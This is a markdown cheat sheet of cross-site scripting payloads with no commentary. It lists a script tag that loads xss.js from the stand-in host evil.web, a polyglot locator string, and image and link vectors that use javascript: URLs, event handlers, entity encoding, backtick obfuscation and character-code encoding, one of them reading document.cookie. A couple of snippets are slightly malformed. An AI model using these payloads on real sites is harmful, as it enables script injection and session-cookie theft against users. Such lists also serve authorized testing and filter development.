#### standard JS injection

```<script src="http://evil.web/xss.js></script>```

-----


#### XSS locator

```";!--"<XSS>=&{{}}```

```javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>```

-----


#### image XSS

```<img src="javascript:alert('XSS');">```

-----


#### no quotes no semicolon

```<img src=javascript:alert('XSS')>```

-----


#### HTML entities

```<img src=javascript:alert(&quot;XSS&quot;)>```

-----


#### grave obfuscation

```<img src=`javascript:alert("test, 'XSS'")`>

-----


#### malformed A tag

```\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>```

-----


#### malformed IMG tag

```<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>```

-----


#### char encoded

```<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>```

-----


#### mouseover

```<IMG SRC=# onmouseover="alert('xxs')">```

-----


#### empty SRC

```<IMG SRC= onmouseover="alert('xxs')">```

-----


